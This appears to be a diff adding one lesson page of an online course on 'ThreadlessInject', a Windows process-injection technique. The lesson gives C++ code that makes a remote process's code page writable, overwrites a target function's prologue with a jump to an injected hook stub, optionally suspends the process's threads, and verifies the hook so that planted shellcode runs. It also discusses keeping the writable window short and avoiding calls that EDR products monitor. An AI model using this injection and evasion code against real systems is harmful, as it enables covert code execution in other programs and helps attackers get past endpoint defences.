@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 6: Installing the Remote Hook - ThreadlessInject Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F9F5;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#14b8a6;--accent2:#0d9488;--gradient:linear-gradient(135deg,#14b8a6,#0d9488)}</style>
+</head>
+<body>
+
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>ThreadlessInject Course</h2>
+<span>Threadless Injection Masterclass</span>
+</div>
+<a class="home-link" href="../ThreadlessInject_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span class="diff d1">1</span> Thread Creation Problem</a>
+<a class="mod-link" href="module2.html"><span class="diff d1">2</span> Remote Function Hooking</a>
+<a class="mod-link" href="module3.html"><span class="diff d1">3</span> Target Function Selection</a>
+<a class="mod-link" href="module4.html"><span class="diff d2">4</span> Remote Memory Allocation</a>
+<a class="mod-link" href="module5.html"><span class="diff d2">5</span> Hook Stub Architecture</a>
+<a class="mod-link active" href="module6.html"><span class="diff d2">6</span> Installing Remote Hook</a>
+<a class="mod-link" href="module7.html"><span class="diff d3">7</span> Execution &amp; Cleanup</a>
+<a class="mod-link" href="module8.html"><span class="diff d3">8</span> Full Chain &amp; Detection</a>
+</nav>
+
+<main>
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 6: Installing the Remote Hook</h1>
+<p class="subtitle">The moment of truth: overwriting the target function's prologue to redirect execution.</p>
+
+<div class="card highlight">
+<h4>The Final Step Before Execution</h4>
+<p>At this point, the shellcode and hook stub are sitting in executable memory inside the target process, waiting to be called. The only remaining step is to overwrite the first 14 bytes of the target function with a JMP instruction that redirects to our hook stub. This is the most dangerous operation in the entire chain: you are modifying executable code in a running process. If another thread is executing those bytes at the moment you overwrite them, the process crashes.</p>
+</div>
+
+<h2>Constructing the Hook Jump</h2>
+<p>The hook is a 14-byte absolute jump that redirects execution from the target function's entry point to the hook stub in our allocated memory region:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Build the 14-byte absolute JMP that will overwrite the function prologue
+BYTE hookJmp[14];
+
+// JMP [RIP+0] - opcode FF 25, with 00000000 as RIP-relative offset
+hookJmp[0] = 0xFF;
+hookJmp[1] = 0x25;
+*(DWORD*)(hookJmp + 2) = 0x00000000;  // Offset 0: address follows immediately
+
+// The 8-byte absolute address of our hook stub in the remote process
+*(UINT64*)(hookJmp + 6) = (UINT64)remoteHookStubAddr;
+
+// hookJmp now contains:
+// FF 25 00 00 00 00 [8 bytes: address of hook stub]
+// When executed, the CPU reads the 8 bytes after the JMP instruction
+// and loads them into RIP, transferring control to our hook stub</code></pre>
+
+<h2>Making the Target Function Writable</h2>
+<p>Code pages in a running process are typically mapped as <code>PAGE_EXECUTE_READ</code> (RX). You cannot write to them without first changing the page protection. This requires <code>NtProtectVirtualMemory</code> on the remote process:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Step 1: Change the target function's page protection to RWX temporarily
+PVOID protectAddr = (PVOID)hookedFuncAddr;
+SIZE_T protectSize = 14;  // We only need to write 14 bytes
+ULONG oldProtect = 0;
+
+NTSTATUS status = NtProtectVirtualMemory(
+    hProcess,
+    &amp;protectAddr,
+    &amp;protectSize,
+    PAGE_EXECUTE_READWRITE,  // Temporarily make writable + executable
+    &amp;oldProtect              // Save old protection (should be PAGE_EXECUTE_READ)
+);
+
+// Step 2: Write the 14-byte hook JMP over the function prologue
+SIZE_T written = 0;
+NtWriteVirtualMemory(
+    hProcess,
+    (PVOID)hookedFuncAddr,   // Destination: start of target function
+    hookJmp,                  // Source: our 14-byte JMP
+    14,                       // Size: exactly 14 bytes
+    &amp;written
+);
+
+// Step 3: Restore original page protection
+NtProtectVirtualMemory(
+    hProcess,
+    &amp;protectAddr,
+    &amp;protectSize,
+    oldProtect,              // Restore to original protection (RX)
+    &amp;oldProtect
+);</code></pre>
+
+<div class="card warn">
+<h4>The RWX Window</h4>
+<p>Notice that for a brief moment, the target function's code page has <code>PAGE_EXECUTE_READWRITE</code> protection. This is a transient state &mdash; the protection is changed, the 14 bytes are written, and the protection is immediately restored. A memory scanner running at exactly the right moment could detect this temporary RWX state, but in practice the window is microseconds long. ThreadlessInject minimizes this window by performing the write as quickly as possible.</p>
+</div>
+
+<h2>Thread Safety During Hook Installation</h2>
+<p>The most dangerous race condition in any hooking technique is the moment of overwriting the target bytes. If a thread in the target process is executing the function at the exact instruction that you are overwriting, the thread will execute a partially-overwritten instruction and crash. Consider what happens step by step:</p>
+
+<div class="diagram">
+<h4>Race Condition: Partial Hook Write</h4>
+<div class="flow" style="flex-direction:column;gap:6px;align-items:stretch;max-width:600px;margin:0 auto">
+<div class="box" style="width:100%"><strong>Time T0</strong>: Original bytes are [48 89 5C 24 08 48 89 6C 24 10 48 89 74 24 18 ...]</div>
+<div class="box y" style="width:100%"><strong>Time T1</strong>: Thread A's RIP is at byte 3 (mid-instruction). Writer begins overwriting.</div>
+<div class="box r" style="width:100%"><strong>Time T2</strong>: Bytes are now [FF 25 00 00 00 00 XX XX XX XX 48 89 74 24 18 ...] &mdash; partially written</div>
+<div class="box r" style="width:100%"><strong>Time T3</strong>: Thread A advances to byte 6, hits garbage opcode XX XX &mdash; CRASH</div>
+</div>
+</div>
+
+<p>There are several strategies to mitigate this risk:</p>
+
+<h3>Strategy 1: Atomic 8-Byte Writes</h3>
+<p>On x86-64 processors, aligned 8-byte writes are guaranteed to be atomic. Unfortunately, our 14-byte hook exceeds this limit. However, you can split the approach: if you can fit a 5-byte relative JMP (<code>E9 xx xx xx xx</code>) that reaches a nearby trampoline, you only need to overwrite 5 bytes, and with careful alignment, the critical first 8 bytes can be written atomically using an interlocked operation.</p>
+
+<pre><code><span class="lang-tag">C++</span>// Atomic write strategy using InterlockedCompareExchange64
+// This only works if your detour is within +/- 2GB (relative JMP range)
+// and you can fit the patch in 8 bytes
+
+// Build an 8-byte patch: 5-byte relative JMP + 3 bytes of NOPs
+BYTE patch[8] = {0};
+INT32 relOffset = (INT32)((INT64)hookStubAddr - (INT64)(hookedFuncAddr + 5));
+patch[0] = 0xE9;                          // JMP rel32
+*(INT32*)(patch + 1) = relOffset;         // 32-bit relative offset
+patch[5] = 0x90; patch[6] = 0x90; patch[7] = 0x90;  // NOP padding
+
+// Atomic 8-byte write (in-process example; remote requires different approach)
+InterlockedCompareExchange64(
+    (volatile LONG64*)hookedFuncAddr,
+    *(LONG64*)patch,                      // New value (our JMP + NOPs)
+    *(LONG64*)hookedFuncAddr              // Expected current value
+);</code></pre>
+
+<div class="card">
+<h4>ThreadlessInject's Approach</h4>
+<p>In practice, ThreadlessInject uses the simpler <code>NtWriteVirtualMemory</code> approach for the full 14-byte overwrite. The rationale is that thread safety concerns are mitigated by choosing a target function that is not being actively executed at the moment of hook installation. If the function is one that threads call periodically (like a sleep or wait function), there is typically a window between calls where no thread is executing the prologue. The risk is accepted as low for well-chosen targets.</p>
+</div>
+
+<h3>Strategy 2: Suspend/Resume Target Threads</h3>
+<p>A more robust (but noisier) approach is to suspend all threads in the target process before installing the hook, then resume them after:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Suspend all threads in target process before hook installation
+// WARNING: This is detectable and can cause deadlocks
+HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+THREADENTRY32 te32;
+te32.dwSize = sizeof(THREADENTRY32);
+
+std::vector&lt;HANDLE&gt; threads;
+if (Thread32First(hSnap, &amp;te32)) {
+    do {
+        if (te32.th32OwnerProcessID == targetPid) {
+            HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
+            if (hThread) {
+                SuspendThread(hThread);
+                threads.push_back(hThread);
+            }
+        }
+    } while (Thread32Next(hSnap, &amp;te32));
+}
+
+// Install the hook (safe now, all threads are suspended)
+InstallHookJmp(hProcess, hookedFuncAddr, hookJmp);
+
+// Resume all threads
+for (HANDLE h : threads) {
+    ResumeThread(h);
+    CloseHandle(h);
+}</code></pre>
+
+<p>However, suspending threads is itself detectable (EDRs monitor <code>SuspendThread</code> calls targeting other processes) and can cause deadlocks if a suspended thread holds a lock that other code needs. ThreadlessInject avoids this approach in favor of the simpler non-atomic write with careful target selection.</p>
+
+<h2>Verifying Hook Installation</h2>
+<p>After writing the hook, a prudent implementation verifies that the write succeeded by reading back the bytes:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Verify the hook was installed correctly
+BYTE verification[14] = {0};
+NtReadVirtualMemory(hProcess, (PVOID)hookedFuncAddr, verification, 14, NULL);
+
+// Compare with expected hook bytes
+if (memcmp(verification, hookJmp, 14) != 0) {
+    // Hook installation failed - another thread may have modified the bytes
+    // or an EDR may have blocked the write
+    printf("[-] Hook verification failed!\n");
+    // Cleanup: free remote memory, close handles
+    return FALSE;
+}
+printf("[+] Hook installed successfully at 0x%p\n", (void*)hookedFuncAddr);</code></pre>
+
+<h2>The Complete Installation Sequence</h2>
+<p>Putting it all together, here is the full sequence of operations for hook installation:</p>
+
+<div class="diagram">
+<h4>Hook Installation Timeline</h4>
+<div class="flow" style="flex-direction:column;gap:4px;align-items:stretch;max-width:550px;margin:0 auto">
+<div class="box" style="width:100%"><strong>1.</strong> Change target page protection: RX &rarr; RWX</div>
+<div class="box hl" style="width:100%"><strong>2.</strong> Write 14-byte JMP over function prologue (NtWriteVirtualMemory)</div>
+<div class="box" style="width:100%"><strong>3.</strong> Restore target page protection: RWX &rarr; RX</div>
+<div class="box y" style="width:100%"><strong>4.</strong> Verify hook bytes (NtReadVirtualMemory)</div>
+<div class="box g" style="width:100%"><strong>5.</strong> Hook is live &mdash; next call to target function triggers shellcode</div>
+</div>
+</div>
+
+<div class="card green">
+<h4>What Happens Next</h4>
+<p>At this point, the hook is installed. The target function's first 14 bytes are now a JMP to your hook stub. The next time any thread in the target process calls that function, execution will transfer to the hook stub, which will save registers, call the shellcode, restore registers, execute the original prologue bytes, and jump back to the function. From the injector's perspective, the job is done &mdash; you can close the process handle and exit. The shellcode will execute asynchronously whenever a target thread calls the hooked function.</p>
+</div>
+
+<div class="quiz" id="quiz6">
+<h4>Pop Quiz: Installing the Remote Hook</h4>
+<div class="quiz-q" data-correct="0">
+<p>Q1: Why must you change the target function's page protection before writing the hook?</p>
+<label data-opt="0"><input type="radio" name="q6_0"> Code pages are mapped as PAGE_EXECUTE_READ (no write permission), so writing would cause an access violation</label>
+<label data-opt="1"><input type="radio" name="q6_0"> It is needed to prevent the CPU from caching the old instructions</label>
+<label data-opt="2"><input type="radio" name="q6_0"> Windows requires PAGE_READWRITE for all memory operations</label>
+<label data-opt="3"><input type="radio" name="q6_0"> The protection change signals the OS to flush the TLB</label>
+<div class="explain">DLL code sections (.text) are mapped with PAGE_EXECUTE_READ protection. This means the memory can be read and executed, but not written to. NtWriteVirtualMemory to this region would fail with STATUS_ACCESS_VIOLATION unless you first change the protection to include write access.</div>
+</div>
+<div class="quiz-q" data-correct="2">
+<p>Q2: Why does ThreadlessInject avoid suspending all threads before hook installation?</p>
+<label data-opt="0"><input type="radio" name="q6_1"> Windows does not allow cross-process thread suspension</label>
+<label data-opt="1"><input type="radio" name="q6_1"> Suspending threads makes the target process run faster</label>
+<label data-opt="2"><input type="radio" name="q6_1"> Thread suspension is detectable by EDRs and can cause deadlocks if suspended threads hold locks</label>
+<label data-opt="3"><input type="radio" name="q6_1"> SuspendThread requires kernel-mode access</label>
+<div class="explain">SuspendThread targeting threads in another process is monitored by EDRs and requires THREAD_SUSPEND_RESUME access, which adds to the detection surface. Additionally, if a suspended thread holds a critical section or mutex, other threads (or the entire process) may deadlock when they try to acquire that lock.</div>
+</div>
+<div class="quiz-q" data-correct="1">
+<p>Q3: What is the advantage of a 5-byte relative JMP (E9) over the 14-byte absolute JMP (FF 25)?</p>
+<label data-opt="0"><input type="radio" name="q6_2"> A 5-byte JMP can reach any address in 64-bit space</label>
+<label data-opt="1"><input type="radio" name="q6_2"> Fewer bytes to overwrite means smaller race condition window and potentially atomic 8-byte writes</label>
+<label data-opt="2"><input type="radio" name="q6_2"> The 5-byte JMP is faster to execute</label>
+<label data-opt="3"><input type="radio" name="q6_2"> A 5-byte JMP is undetectable by memory scanners</label>
+<div class="explain">A 5-byte relative JMP overwrites fewer instructions, reducing the chance of a thread being mid-instruction during the overwrite. More importantly, the 5-byte patch (plus 3 NOP bytes) fits in 8 bytes, which can be written atomically with an interlocked compare-exchange on x64 CPUs. The downside is the +/- 2GB range limitation.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz6')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module5.html">&larr; Previous: Hook Stub Architecture</a>
+<a class="primary" href="module7.html">Next: Execution &amp; Cleanup &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
